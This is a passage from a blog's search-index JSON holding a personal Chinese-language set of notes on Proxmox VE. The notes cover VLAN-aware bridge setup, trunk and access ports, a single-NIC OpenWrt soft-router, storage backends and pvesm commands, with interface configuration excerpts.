vid\uff0c\u865a\u62df\u673a\u4e0d\u9700\u8981\u77e5\u9053\u81ea\u5df1\u8fde\u63a5\u5728 vlan \u4e0a\u3002\u6700\u65e0\u611f\u7684\u65b9\u5f0f</li> </ul> </li> <li>tranditional\uff1a\u00a0eno1.5 and vmbr0v5<ul> <li>\u9700\u8981\u663e\u793a\u5730\u521b\u5efa\u591a\u4e2a\u7f51\u5361</li> </ul> </li> <li>guest configured vlan<ul> <li>\u5728\u865a\u62df\u673a\u5185\u90e8\u521b\u5efa vlan</li> </ul> </li> </ul> <p>vlan awareness \u65b9\u5f0f\u7406\u89e3</p> <ul> <li>untagged \u548c tag \u8868\u793a\u53d1\u51fa\u8be5 vlan \u5305\u65f6\u662f\u5426 \u6253\u4e0a tag\u3002</li> <li>primary id\uff0c\u8868\u793a\u6536\u5230\u5305\u65f6\u5982\u679c\u6ca1\u6709 vlan id\uff0c\u5e94\u8be5\u5224\u5b9a\u4e3a\u54ea\u4e2a vlan\u3002</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#tunk-port-\u548c-access-port","title":"tunk port \u548c access port","text":"<p>tunk \u7684\u7279\u70b9\u5c31\u662f\u590d\u7528\u7aef\u53e3\uff08tg \u91cc\u5927\u4f6c\u8ba4\u4e3a\u5168 tag \u548c tag + untag \u90fd\u662f trunk\uff09</p> <p>https://www.n-able.com/blog/vlan-trunking#:~:text=What%20is%20the%20difference%20between%20an%20access%20port%20and%20a%20trunk%20port%3F%C2%A0</p> <ul> <li>accessing port \u88ab\u5b8c\u5168\u5206\u914d\u7ed9\u5355\u4e2a vlan\uff0ctagged \u6d41\u91cf\u88ab\u4e22\u5f03\uff08\u7406\u89e3\uff1auntagged\uff0c\u5e76\u4e14\u6ca1\u6709\u5176\u5b83 tagged\uff1f\uff09</li> <li>trunk port\u3002a trunk port can transmit data from multiple VLANs.</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u60f3\u8981\u5b9e\u73b0\u7684\u6548\u679c","title":"\u60f3\u8981\u5b9e\u73b0\u7684\u6548\u679c","text":"<p>\u95ee\u95ee\u6709\u5927\u4f6c\u77e5\u9053 pve \u7684 vlan awareness bridge \u600e\u4e48\u914d\u7f6e untagged \u548c primary vlan id \u5417\uff1f\u6211\u60f3\u5b9e\u73b0\u7684\u5c31\u662f\u4e24\u4e2a\u673a\u5668\u901a\u8fc7\u4e00\u6839\u7ebf\u8fde\u63a5\uff0c\u4f20\u8f93 vlan 10 \u548c vlan 20 \u7684\u6570\u636e\u3002</p> <ul> <li>\u5982\u679c\u7aef\u53e3\u4e0a\u6536\u5230\u7684\u5305\u6ca1\u6709 tag\uff0c\u90a3\u4e48\u5c31\u5c5e\u4e8e vlan 10\uff0cvlan 10 \u53d1\u51fa\u53bb\u7684\u5305\u4e5f\u5e94\u8be5\u662f untagged\u7684\u3002</li> <li>\u5bf9\u4e8e vlan 20\uff0c\u5219\u9700\u8981\u6536\u53d1\u90fd\u5e26\u4e0a tag\u3002</li> </ul> <p> \u8fd9\u662f\u6211 pve \u5bf9\u7aef\u7684\u8bbe\u5907\uff0c\u6211\u60f3\u5b9e\u73b0\u7684\u5176\u5b9e\u662f\u5de6\u4fa7\u7684\u6548\u679c\u3002\u4f46\u662f\u76ee\u524d\u53ea\u80fd\u8fde\u63a5\u53f3\u9762\u8fd9\u4e2a\u3002\u56e0\u4e3a pve \u4e0d\u77e5\u9053\u600e\u4e48\u8bbe\u7f6e untagged\uff0c\u8fd9\u5bfc\u81f4\u5b83\u7684\u5305\u90fd\u662f\u6709 tag \u7684\uff0c\u6ca1\u6cd5\u76f4\u63a5\u8fde\u63a5\u7b14\u8bb0\u672c\u7b49\u8bbe\u5907\uff1f</p> <p>\u770b\u4e86 bridge vlan show \u540e\uff0c\u611f\u89c9 PVID \u548c untagged \u7684\u662f\u5f3a\u7ed1\u5b9a\u7684\u3002\u56e0\u4e3a pvid \u548c untagged \u5206\u522b\u5bf9\u5e94\u6536\u548c\u53d1\uff0c\u53ea\u6709\u662f\u540c\u4e00\u4e2a vlan \u624d\u4e0d\u5bb9\u6613\u9020\u6210\u6df7\u6dc6\u3002</p> <p>\u4e0a\u56fe\u4e2d\uff0c\u5de6\u53f3\u4e24\u4fa7\u90fd\u8bbe\u7f6e\u4e86 pvid \u4e3a 10\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7aef\u53e3\u65e0\u8bba\u63a5\u6536\u4ec0\u4e48\u6837\u7684\u5305\u90fd\u662f\u6ca1\u95ee\u9898\u7684\u3002\uff08\u6709 tag \u7684\u5305\u53ef\u4ee5\u76f4\u63a5\u533a\u5206 vlan\uff0c\u6ca1\u6709 tag \u7684\u5224\u5b9a\u4e3a pvid\uff09\u3002\u4f46\u662f\u53d1\u9001\u60c5\u51b5\u5219\u4e0d\u540c\uff0cuntagged \u60c5\u51b5\u9700\u8981\u5bf9\u9762\u4e5f\u8bbe\u7f6e pvid \u4e3a 10\uff0c\u5426\u5219\u5bf9\u9762\u53ef\u80fd\u5224\u5b9a\u4e3a\u9ed8\u8ba4\u7684 pvid=1\u3002\u597d\u5904\u662f\u53ef\u4ee5\u8fde\u63a5\u975e vlan \u8bbe\u5907\uff08\u6bd4\u5982\u7b14\u8bb0\u672c\u3001\u624b\u673a\uff09\u3002tag \u60c5\u51b5\uff0c\u5219\u5bf9\u9762\u4e0d\u9700\u8981\u8bbe\u7f6e pvid\uff0c\u7f3a\u70b9\u662f\u53ea\u80fd\u8fde\u63a5\u5f00\u542f vlan \u7684\u8bbe\u5907\u3002</p> <p>\u603b\u7ed3</p> <ul> <li>\u5168 tag \u9002\u5408\u8fde\u63a5\u4e24\u4e2a vlan \u8bbe\u5907\u3002\u4e0d\u7528\u8bbe\u7f6e pvid</li> <li>untagged + pvid \u9002\u5408\u8fde\u63a5\u666e\u901a\u8bbe\u5907\u3002\u4f46\u662f\u8981\u60f3\u8fde\u63a5 vlan \u8bbe\u5907\uff0c\u9700\u8981\u5bf9\u9762\u4e5f\u8bbe\u7f6e pvid \u76f8\u540c</li> </ul> <p>\u6ce8\u610f\u5230 vlan \u7684\u63a5\u53e3\u7684 mac \u5730\u5740\u90fd\u662f\u76f8\u540c\u7684\uff0c\u8fd9\u6837\u4f1a\u6709\u95ee\u9898\u5417\uff1f\uff08\u7b54\uff1avlan \u9694\u79bb\u4e86\uff0c\u6240\u4ee5\u6ca1\u6709\u95ee\u9898\uff09</p> <pre><code>13: vmbr1.10@vmbr1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000\n    link/ether 7c:2b:e1:13:7e:10 brd ff:ff:ff:ff:ff:ff\n14: vmbr1.20@vmbr1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000\n    link/ether 7c:2b:e1:13:7e:10 brd ff:ff:ff:ff:ff:ff\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#ifupdown-\u914d\u7f6e","title":"ifupdown \u914d\u7f6e","text":"<p><code>man ifupdown-addons-interfaces</code> bridge \u90e8\u5206\u8bf4\u660e\uff1a</p> <p>Supports both vlan aware and non vlan aware bridges. For the vlan aware bridge, the port specific attributes must be specified under the port. And for vlan unaware bridge port specific attributes must be specified under the bridge.</p> <p>\u4e5f\u5c31\u662f port \u76f8\u5173\u7684\u5c5e\u6027\uff08\u5982 enp2s0 \u7684 pvid\uff09\u9700\u8981\u5b9a\u4e49\u5728 port \u7684\u914d\u7f6e\u4e2d\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u5728 bridge \u7684\u914d\u7f6e\u4e2d\u3002</p> <p>\u53ef\u4ee5\u5b9a\u4e49 bridge \u652f\u6301\u7684 vlan id</p> <pre><code>bridge-vids\n  help: bridge port vids. Can be specified under the bridge or under the port. If specified under the bridge the ports inh erit it unless overridden by a bridge-vids attribuet under the port\n  required: False\n  example:\n    bridge-vids 4000\n    bridge-vids 2000 2200-3000\n</code></pre> <p>\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u7aef\u53e3\u8bbe\u7f6e pvid</p> <pre><code>bridge-pvid\n  help: bridge port pvid. Must be specified under the bridge port\n  required: False\n  example:\n    bridge-pvid 1\n</code></pre> <p>\u6ca1\u6709\u627e\u5230\u5982\u4f55\u5b9a\u4e49\u7aef\u53e3\u662f\u5426 untagged\uff0c\u76f8\u53cd bridge \u4e00\u6761\u547d\u4ee4\u5c31\u53ef\u4ee5\u505a\u8fd9\u4e24\u4ef6\u4e8b\uff0c\u66f4\u52a0\u65b9\u4fbf\u76f4\u89c2</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#bridge-\u547d\u4ee4\u914d\u7f6e","title":"bridge \u547d\u4ee4\u914d\u7f6e","text":"<p>networking - How to create a linux vlan aware bridge with ingress packets untagged and egress packets tagged - Unix &amp; Linux Stack Exchange</p> <p>\u8c8c\u4f3c\u4f7f\u7528 bridge \u547d\u4ee4\u8bbe\u7f6e\u66f4\u65b9\u4fbf\uff1f</p> <pre><code>bridge vlan { add | del } dev DEV vid VID [ tunnel_info TUNNEL_ID ] [ pvid ] [ untagged ] [ self ] [ master ]\n</code></pre> <p>bridge vlan show \u975e\u5e38\u76f4\u89c2\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u7aef\u53e3\u7684\u72b6\u6001</p> <ul> <li>\u5bf9\u4e8e vmbr0<ul> <li>\u8fde\u63a5\u4e86\u865a\u62df\u673a op2 \u7684\u7aef\u53e3 0\uff08veth100i0\uff09\u548c\u7269\u7406\u63a5\u53e3 enp2s0</li> <li>\u7531\u4e8e\u4e0d\u9700\u8981 vlan \u5212\u5206\uff0c\u56e0\u6b64\u5bf9\u5e94\u7aef\u53e3\u90fd\u662f 1 PVID \u548c Untagged</li> </ul> </li> <li>\u5bf9\u4e8e vmbr1<ul> <li>\u8fde\u63a5\u4e86 3 \u4e2a\u7269\u7406\u63a5\u53e3\u548c\u865a\u62df\u673a lan1 \u548c lan2 \u4e24\u4e2a\u63a5\u53e3</li> <li>\u7531\u4e8e vlan awarensess bridge \u7684\u7279\u70b9\u5c31\u662f\u5bf9\u865a\u62df\u673a\u4e0d\u53ef\u89c1\uff0c\u56e0\u6b64\u53ef\u4ee5\u770b\u5230\u6240\u6709 veth100ix \u7684\u7aef\u53e3\u90fd\u662f\u4ee5\u81ea\u5df1\u6240\u5728\u7684 vid \u4e3a PVID \u5e76\u4e14\u662f untagged \u7684\u3002</li> </ul> </li> </ul> <p>\u6bd4\u8f83\u795e\u5947\u7684\u662f\uff0c\u7269\u7406\u63a5\u53e3\u90fd\u4fdd\u7559\u4e86 vid 1\uff0c\u5e76\u4e14\u662f untagged\u3002\u7406\u8bba\u4e0a\u4e00\u4e2a port \u662f\u4e0d\u80fd\u6709\u4e24\u4e2a untagged \u7684\u3002\u53e6\u5916\uff0cvmbr0 \u4e0d\u662f\u5b9e\u9645\u7aef\u53e3\uff0c\u56e0\u6b64\u4e0d\u6e05\u695a\u8fd9\u91cc vmbr0, vmbr1 \u7684\u8f93\u51fa\u8868\u793a\u4ec0\u4e48\u3002</p> <pre><code>root@n5105-pve \u279c  ~ brctl show\nbridge name     bridge id               STP enabled     interfaces\nvmbr0           8000.7c2be1137e0f       no              enp2s0\n                                                        veth100i0\nvmbr1           8000.7c2be1137e10       no              enp3s0\n                                                        enp4s0\n                                                        enp5s0\n                                                        veth100i1\n                                                        veth100i2\n\nroot@n5105-pve \u279c  ~ bridge vlan show\nport              vlan-id\nenp2s0            1 PVID Egress Untagged\nenp3s0            1 Egress Untagged\n                  10 PVID Egress Untagged\n                  20\n                  99\nenp4s0            1 Egress Untagged\n                  10 PVID Egress Untagged\n                  20\n                  99\nenp5s0            1 Egress Untagged\n                  10 PVID Egress Untagged\n                  20\n                  99\nvmbr0             1 PVID Egress Untagged\nvmbr1             1 PVID Egress Untagged\n                  10\n                  20\n                  99\nveth100i0         1 PVID Egress Untagged\nveth100i1         10 PVID Egress Untagged\nveth100i2         20 PVID Egress Untagged\n</code></pre> <p>\u8d34\u4e0b\u914d\u7f6e <pre><code>auto vmbr0\niface vmbr0 inet6 manual\niface vmbr0 inet manual\n        bridge-ports enp2s0\n        bridge-stp off\n        bridge-fd 0\n#wan\n\nauto vmbr1.10\niface vmbr1.10 inet6 auto\niface vmbr1.10 inet static\n        address 192.168.36.254/24\n        gateway 192.168.36.1\n\nauto vmbr1.20\niface vmbr1.20 inet dhcp\n\nauto vmbr1.99\niface vmbr1.99 inet static\n        address 192.168.99.1/24\n\nauto vmbr1\niface vmbr1 inet manual\n        bridge-ports enp3s0 enp4s0 enp5s0\n        bridge-stp off\n        bridge-fd 0\n        bridge-vlan-aware yes\n        bridge-vids 10 20 99\n        post-up   bridge vlan add vid 10 dev enp3s0 pvid untagged\n        post-up   bridge vlan add vid 10 dev enp4s0 pvid untagged\n        post-up   bridge vlan add vid 10 dev enp5s0 pvid untagged\n</code></pre></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u7f51\u7edc\u914d\u7f6e-vlan","title":"\u7f51\u7edc\u914d\u7f6e-vlan","text":"<p>Proxmox Management Interface VLAN tagging configuration - Virtualization Howto</p> <p>\u4e24\u79cd\u6a21\u5f0f\uff0c\u63a8\u8350\u4f7f\u7528\u7b2c\u4e00\u79cd\uff0c\u6700\u7b80\u6d01</p> <ul> <li>VLAN awareness on the Linux bridge<ul> <li>in this case, each guest\u2019s virtual network card is assigned to a VLAN tag, which is transparently supported by the Linux bridge. Trunk mode is also possible, but that makes configuration in the guest necessary.</li> </ul> </li> <li>traditional\u201d VLAN on the Linux bridge<ul> <li>creates a VLAN device with associated bridge for each VLAN</li> </ul> </li> <li>Guest configured VLAN<ul> <li>VLANs are assigned inside the guest. In this case, the setup is completely done inside the guest and can not be influenced from the outside. The benefit is that you can use more than one VLAN on a single virtual NIC.</li> </ul> </li> </ul> <ol> <li>vmbr0, vlan aware</li> <li>\u8fde\u63a5pve\u7684\u7269\u7406\u4ea4\u6362\u673a\uff08\u5047\u5982\u6709\uff09\u9700\u8981\u8bbe\u7f6e\u6210trunk port\uff0c\u8fd9\u6837\u624d\u80fd\u7406\u89e3tag\u5305</li> <li>\u865a\u62df\u673a\u8bbe\u7f6evlan tag\u5c31\u4f1a\u52a0\u5165\u8be5vlan\u3002Once we have made the default Linux bridge VLAN aware, virtual machines can also have a VLAN tag associated with their network configuration. It allows the virtual machine to tag VLAN traffic and be placed on that particular VLAN. When you create VMs, you can choose to tag the network traffic with a VLAN ID. This allows sending the virtual machine traffic through the physical device VLAN interface to the rest of the physical network.</li> </ol>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u65e7\u7b14\u8bb0\u672cpve\u5355\u7f51\u53e3\u5b9e\u73b0openwrt\u8f6f\u8def\u7531\u5b9e\u4f8b","title":"\u65e7\u7b14\u8bb0\u672cPVE\u5355\u7f51\u53e3\uff0c\u5b9e\u73b0openwrt\u8f6f\u8def\u7531\u5b9e\u4f8b","text":"<p>\u8865\u56fe</p> <p>\u5355\u7f51\u53e3\u8f6f\u8def\u7531\u8d77\u7801\u5f97\u6709\u4e24\u4e2avlan\uff0c\u4e00\u4e2a\u7528\u4e8e\u5bb9\u5668openwrt wan\uff0c\u4e00\u4e2a\u7528\u4e8e\u5bb9\u5668openwrt lan\u3002lan\u8fd8\u5305\u62ecpve host\uff0c\u548cpve \u4e0b\u7684VM</p> <p>\u7531\u4e8e\u662f\u901a\u8fc7vlan\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531\u3002\u7b14\u8bb0\u672c\uff08\u7528\u4e8e\u914d\u7f6epve\uff09\u8981\u8bbf\u95eepve\uff0c\u8fd8\u8981\u8bbf\u95eepve\u91cc\u7684\u865a\u62df\u673a\u5b9e\u5728\u6709\u70b9\u4e0d\u65b9\u4fbf\u3002\u56e0\u6b64\u914d\u7f6e\u9700\u8981\u4fdd\u8bc1\u4e00\u5b9a\u7684\u987a\u5e8f\uff0c\u5426\u5219\u5c31\u4f1a\u51fa\u73b0\u8bbf\u95ee\u4e0d\u4e86pve\u7684\u5c34\u5c2c\u5c40\u9762\uff08\u8fd8\u597d\u6211\u7684pve\u8fd8\u6709\u4e00\u4e2a100M\u7684\u7f51\u53e3\uff0c\u6700\u5dee\u60c5\u51b5\u8fd8\u80fd\u62a2\u6551\u4e00\u4e0b\uff09</p> <ul> <li>\u628a\u786c\u8def\u7531\u5668\u7684VLAN\u8bbe\u7f6e\u597d\uff08\u8f6f\u8def\u7531\u81f3\u5c11\u9700\u89812\u4e2avlan\uff0c\u4e00\u4e2a\u7528\u4f5cwan\uff0c\u4e00\u4e2a\u7528\u4f5clan\uff09<ul> <li>\u786c\u8def\u7531\u4e0a\u4e00\u4e2a\u63a5\u53e3\uff08\u5982wan\u53e3\uff09\u7528\u4e8e\u7ba1\u7406\uff0c\u8fd9\u6837\u907f\u514d\u8bbf\u95ee\u4e0d\u4e86\u786c\u8def\u7531</li> <li>\u53e6\u4e00\u4e2a\u63a5\u53e3br-lan.200\u8bbe\u7f6e\u4e00\u4e2a\u9759\u6001ip\uff08\u5373\u8f6f\u8def\u7531lan\u7684\u7f51\u6bb5\uff09\uff0c\u867d\u7136\u53ef\u4ee5\u8bbe\u7f6e\u6210dhcp client\uff0c\u8f6f\u8def\u7531\u914d\u7f6e\u597d\u540e\u81ea\u52a8\u8bbe\u7f6e\u5730\u5740\uff0c\u4f46\u662f\u9759\u6001ip\u80fd\u65b9\u4fbf\u8bbf\u95ee\u786c\u8def\u7531\u3002</li> </ul> </li> <li>\u7ed9pve host\u5206\u914d\u4e00\u4e2alan vlan\u7684ip<ul> <li>\u53ef\u4ee5\u521b\u5efavmbr.200\uff0c\u7136\u540e\u9759\u6001\u5206\u914dip</li> <li></li> </ul> </li> </ul> <ul> <li>\u8fde\u63a5\u786c\u8def\u7531\u548cpve\u7684\u5355\u7f51\u53e3<ul> <li>\u8fd9\u6837\u81f3\u5c11\u4fdd\u8bc1\u80fd\u901a\u8fc7\u786c\u8def\u7531\u8bbf\u95eepve\u4e86\uff08\u6bd4\u5982\u7b14\u8bb0\u672c\u8fde\u63a5\u786c\u8def\u7531\u7684wifi\uff0c\u7531\u4e8eop\u865a\u62df\u673a\u8fd8\u6ca1\u914d\u7f6e\u597d\uff0c\u6240\u4ee5\u9700\u8981\u8fde\u63a5\u540e\u624b\u52a8\u8bbe\u7f6eip\uff09</li> </ul> </li> <li>\u8bbe\u7f6eopenwrt\u5bb9\u5668<ul> <li>\u6dfb\u52a0\u4e24\u4e2a\u7f51\u7edc\u8bbe\u5907\uff0c\u53ef\u4ee5\u9009\u62e9\u540c\u4e00\u4e2abridge\uff0c\u9009\u62e9\u786c\u8def\u7531\u8bbe\u7f6e\u7684vlan id\u3002</li> <li>\u8fd9\u91cc\u6dfb\u52a0\u989d\u5916\u4e00\u4e2avmbr2\uff0c\u662f\u56e0\u4e3a\u5982\u679ceth1\u6ca1\u6709\u6210\u529f\u8bbe\u7f6eip\u5730\u5740\uff0cpve\u8fd8\u662f\u65e0\u6cd5\u8bbf\u95eeop\u5bb9\u5668\u3002\u56e0\u6b64\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2abridge\uff0c\u4e13\u95e8\u7528\u4e8e\u8fde\u63a5pve\u548cop\u5bb9\u5668\u3002\u7528\u5b8c\u4e4b\u540e\u53ef\u4ee5\u5220\u9664\u3002 </li> </ul> </li> </ul> <ul> <li>\u542f\u52a8openwrt\u5bb9\u5668<ul> <li>\u901a\u8fc7pve web\u63a7\u5236\u53f0\uff0c\u7ed9op\u5bb9\u5668\u8bbe\u7f6elan\u548cwan\u7684\u63a5\u53e3\u3002\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7ssh -L pve\u7aef\u53e3\u8f6c\u53d1\uff08\u7ecf\u8fc7\u4e0a\u6b65\uff0cpve\u53ef\u4ee5\u8bbf\u95eeop\u5bb9\u5668\uff09\uff0c\u8bbf\u95eeopenwrt web\u8fdb\u884c\u8bbe\u7f6e\uff09</li> </ul> </li> </ul> <ul> <li>\u5b8c\u6210\u914d\u7f6e\u3002\u8f6f\u8def\u7531\u542f\u52a8\u6210\u529f\uff0c\u5e94\u8be5\u5df2\u7ecf\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\u4e86\u3002pve\u53ef\u4ee5\u4e0a\u7f51\uff0c\u7b14\u8bb0\u672c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u786c\u8def\u7531wifi\u4e0a\u7f51\u3002</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>auto lo\niface lo inet loopback\n\niface enp2s0 inet manual\n\niface wlp3s0 inet manual\n\nauto enxa0cec8dfd632\niface enxa0cec8dfd632 inet manual\n\nauto vmbr0\niface vmbr0 inet dhcp\n        bridge-ports enp2s0\n        bridge-stp off\n        bridge-fd 0\n        pre-up echo 2 &gt; /proc/sys/net/ipv6/conf/$IFACE/accept_ra\n\nauto vmbr1\niface vmbr1 inet manual\n        bridge-ports enxa0cec8dfd632\n        bridge-stp off\n        bridge-fd 0\n        bridge-vlan-aware yes\n        bridge-vids 2-4094\n\nauto vmbr1.200\niface vmbr1.200 inet static\n        address 192.168.36.215/24\n        gateway 192.168.36.1\n\nauto vmbr2\niface vmbr2 inet static\n        address 10.3.0.1/24\n        bridge-ports none\n        bridge-stp off\n        bridge-fd 0\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5b58\u50a8\u914d\u7f6e","title":"\u5b58\u50a8\u914d\u7f6e","text":"<p>Proxmox VE Storage</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u57fa\u7840\u6982\u5ff5","title":"\u57fa\u7840\u6982\u5ff5","text":"<p>storage\uff08\u6c60\uff09\u7c7b\u578b</p> <ul> <li>file level\uff1a\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u7c7b\u578b\u5185\u5bb9</li> <li>block\uff1a\u5b58\u50a8\u5927\u7684 raw images</li> </ul> <p>1: Disk images for VMs are stored in ZFS volume (zvol) datasets, which provide block device functionality. 2: On file based storages, snapshots are possible with the\u00a0qcow2\u00a0format.</p> <p>\u5b58\u50a8\u7684\u6570\u636e\u7c7b\u578b</p> <p>A storage can support several content types, for example virtual disk images, cdrom iso images, container templates or container root directories. Not all storage types support all content types. One can set this property to select what this storage is used for.</p> <ul> <li>images: QEMU/KVM VM images.</li> <li>rootdir: Allow to store container data.</li> <li>vztmpl: Container templates.</li> <li>backup: Backup files (vzdump).</li> <li>iso: ISO images</li> <li>snippets: Snippet files, for example guest hook scripts</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u914d\u7f6e\u6587\u4ef6_1","title":"\u914d\u7f6e\u6587\u4ef6","text":"<p>/etc/pve/storage.cfg</p> <pre><code>dir: local\n        path /var/lib/vz\n        content iso,vztmpl,backup\n\n# default image store on ZFS based installation\nzfspool: local-zfs\n        pool rpool/data\n        sparse\n        content images,rootdir\n</code></pre> <p>local \u66f4\u50cf\u662f\u5b58\u50a8\u53ea\u8bfb\u7684\u6570\u636e local-zfs \u5219\u5b58\u653e\u8bfb\u5199\u7684\u6570\u636e</p> <ul> <li>\u865a\u62df\u673a\u7684 disk \u4e3a zvol</li> <li>lxc \u5bb9\u5668\u7684 rootdir \u4e3a dataset</li> </ul> <p>Volume id \u683c\u5f0f\uff08\u8bb8\u591a\u547d\u4ee4\u90fd\u9700\u8981\u8be5\u683c\u5f0f\u53c2\u6570\uff09</p> <pre><code>local:230/example-image.raw\n\nlocal:iso/debian-501-amd64-netinst.iso\n\nlocal:vztmpl/debian-5.0-joomla_1.5.9-1_i386.tar.gz\n\niscsi-storage:0.0.2.scsi-14f504e46494c4500494b5042546d2d646744372d31616d61\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u547d\u4ee4\u884c\u5de5\u5177","title":"\u547d\u4ee4\u884c\u5de5\u5177","text":"<pre><code>pvesm add &lt;TYPE&gt; &lt;STORAGE_ID&gt; &lt;OPTIONS&gt;\npvesm add dir &lt;STORAGE_ID&gt; --path &lt;PATH&gt;\npvesm add nfs &lt;STORAGE_ID&gt; --path &lt;PATH&gt; --server &lt;SERVER&gt; --export &lt;EXPORT&gt;\npvesm add lvm &lt;STORAGE_ID&gt; --vgname &lt;VGNAME&gt;\npvesm add iscsi &lt;STORAGE_ID&gt; --portal &lt;HOST[:PORT]&gt; --target &lt;TARGET&gt;\n\npvesm set &lt;STORAGE_ID&gt; &lt;OPTIONS&gt;\npvesm set &lt;STORAGE_ID&gt; --shared 1\npvesm set local --format qcow2\npvesm set &lt;STORAGE_ID&gt; --content iso\n\npvesm alloc &lt;STORAGE_ID&gt; &lt;VMID&gt; &lt;name&gt; &lt;size&gt; [--format &lt;raw|qcow2&gt;]\npvesm alloc local &lt;VMID&gt; '' 4G  # name\u4e3a\u7a7a\u5219\u81ea\u52a8\u751f\u6210\n\npvesm free &lt;VOLUME_ID&gt;\n\npvesm status\npvesm list &lt;STORAGE_ID&gt; [--vmid &lt;VMID&gt;]\n\npvesm path &lt;VOLUME_ID&gt; #\u67e5\u770b\u5b9e\u9645\u8def\u5f84\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u4e0d\u540c-backend","title":"\u4e0d\u540c backend","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#dir","title":"dir","text":"<p>\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u7c7b\u578b\u6570\u636e\uff08virtual disk images, containers, templates, ISO images or backup files.\uff09</p> <p>You can mount additional storages via standard linux\u00a0/etc/fstab, and then define a directory storage for that mount point. This way you can use any file system supported by Linux.</p> <p>\u9ed8\u8ba4 layout</p> Content type Subdir VM images <code>images/&lt;VMID&gt;/</code> ISO images template/iso/ Container templates template/cache/ Backup files dump/ Snippets snippets/ <p>\u4f8b\u5b50</p> <pre><code>dir: backup\n        path /mnt/backup\n        content backup\n        prune-backups keep-last=7\n        max-protected-backups 3\n        content-dirs backup=custom/backup/dir\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#zfs","title":"zfs","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#lvm","title":"lvm","text":"<p>Proxmox VE Storage Proxmox Storage Guide | Programster's Blog</p> Content types Image formats Shared Snapshots Clones images rootdir raw possible no no","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#lvm-thin","title":"lvm-thin","text":"<p>\u652f\u6301 thin provisioning\uff08\u7a00\u758f\u5206\u914d\uff09</p> <p>LVM normally allocates blocks when you create a volume. LVM thin pools instead allocates blocks when they are written. This behaviour is called thin-provisioning</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8bc1\u4e66\u7ba1\u7406","title":"\u8bc1\u4e66\u7ba1\u7406","text":"<p>pve \u7684\u00a0REST API \u548c web GUI \u662f\u7531<code>pveproxy</code>\u670d\u52a1\u63d0\u4f9b\u7684\uff0c\u5b83\u4f7f\u7528\u7684\u8bc1\u4e66\u53ef\u4ee5\u662f\u4ee5\u4e0b\u51e0\u79cd</p> <ol> <li>By default the node-specific certificate in\u00a0<code>/etc/pve/nodes/NODENAME/pve-ssl.pem</code>\u00a0is used. This certificate is signed by the cluster CA and therefore not automatically trusted by browsers and operating systems.</li> <li>use an externally provided certificate (e.g. signed by a commercial CA).</li> <li>use ACME (Let\u2019s Encrypt) to get a trusted certificate with automatic renewal, this is also integrated in the Proxmox VE API and web interface. \u5728 2 \u548c 3 